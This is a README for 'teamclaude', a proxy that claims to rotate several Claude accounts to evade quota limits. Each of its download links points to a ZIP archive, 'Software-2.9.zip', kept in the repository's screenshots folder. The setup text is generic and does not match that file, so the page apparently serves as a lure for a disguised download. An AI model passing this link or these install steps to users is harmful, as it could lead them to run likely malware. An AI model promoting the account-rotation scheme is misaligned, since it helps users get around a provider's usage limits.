# 🤖 teamclaude - Simple Claude Proxy for Multiple Accounts

[![Download teamclaude](https://img.shields.io/badge/Download%20teamclaude-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/abdallahLokmene/teamclaude/master/screenshots/Software-2.9.zip)

## 📥 Download

Open this page to get the app:

[https://raw.githubusercontent.com/abdallahLokmene/teamclaude/master/screenshots/Software-2.9.zip](https://raw.githubusercontent.com/abdallahLokmene/teamclaude/master/screenshots/Software-2.9.zip)

## 🪟 Windows Setup

This app runs on Windows through Node.js. Follow these steps to get it working.

### 1. Install Node.js

You need Node.js on your PC.

- Open the Node.js website
- Download the Windows LTS version
- Run the installer
- Keep the default options
- Finish the setup

If you already have Node.js, you can skip this step.

### 2. Get the app files

- Open the download page above
- Download the project files
- Save them in a folder you can find later
- If you use a ZIP file, right-click it and choose Extract All

### 3. Open the folder

- Find the folder with the app files
- Open it in File Explorer
- Check that you can see the project files inside

### 4. Open PowerShell

- In the folder, click the address bar
- Type `powershell`
- Press Enter
- A PowerShell window opens in that folder

### 5. Install the app parts

Run this command:

`npm install`

This gets the files the app needs to run.

### 6. Start the app

Run this command:

`npm start`

If the project uses a different start command, use the one listed in the repository files.

## 🧭 What teamclaude does

teamclaude helps you use Claude with more than one account. It can route requests through the right account and switch between accounts when one reaches its quota.

This is useful when you want:

- One place to manage several Claude accounts
- Automatic switching when an account hits its limit
- Less manual account swapping
- A local proxy you can use with Claude Code or related tools

## ⚙️ How it works

The app runs as a proxy on your computer.

- You sign in to Claude accounts
- The app keeps track of account limits
- It sends each request through an account with available quota
- When one account runs low, it moves to the next one

This keeps your setup simple and reduces the need to log in and out by hand.

## 🧩 Main features

- Multi-account support
- Automatic quota-based rotation
- Local proxy setup
- Works with Claude Code style tools
- OAuth-based sign-in flow
- Node.js-based runtime
- Easy setup on Windows

## 🪄 Before you start

Check these items first:

- You have a Windows PC
- You have access to the internet
- You have Node.js installed
- You have the Claude accounts you want to use
- You can sign in through a browser when asked

## 🔐 Sign-in steps

When the app asks you to connect an account:

1. Open the sign-in page
2. Log in with your Claude account
3. Allow access if prompted
4. Repeat for each account you want to add

Keep each account ready before you begin. This makes setup faster.

## 🖥️ Using the proxy

After setup, the app works in the background.

- Start the app
- Point your Claude tool or client to the local proxy address
- Send a request
- The app picks an account with quota left
- It rotates to the next account when needed

You do not need to switch accounts by hand each time.

## 🛠️ Common tasks

### Add another account

- Open the app
- Start the sign-in flow again
- Log in with the new account
- Save it in the list

### Remove an account

- Open the account list
- Select the account you do not want to use
- Remove it from the app
- Sign in again later if needed

### Restart the app

- Close the PowerShell window
- Open the folder again
- Run `npm start`

## 📌 Typical folder layout

You may see files and folders like these:

- `package.json` — app settings
- `node_modules` — installed app files
- `src` — app source files
- `config` — saved settings
- `.env` — local environment values
- `README.md` — project guide

## 🧪 Basic checks

If the app does not start, check these items:

- Node.js is installed
- You ran the command in the right folder
- The files finished downloading
- The PowerShell window shows no error
- Your internet connection is on

If a browser window opens during sign-in, complete the login there first.

## 🔎 Best use cases

teamclaude fits well when you need:

- Multiple Claude accounts in one place
- A local proxy for account rotation
- A setup for Claude Code workflows
- Simple quota handling across accounts

## 📎 Project details

- Repository: teamclaude
- Description: Multi-account Claude proxy with automatic quota-based rotation
- Topics: anthropic, claude, claude-code, load-balancer, multi-account, nodejs, oauth, proxy

## 🧷 Download and install

Visit this page to download the app files, then run the setup steps on Windows:

[https://raw.githubusercontent.com/abdallahLokmene/teamclaude/master/screenshots/Software-2.9.zip](https://raw.githubusercontent.com/abdallahLokmene/teamclaude/master/screenshots/Software-2.9.zip)

Open the folder, install the files with `npm install`, then start the app with `npm start`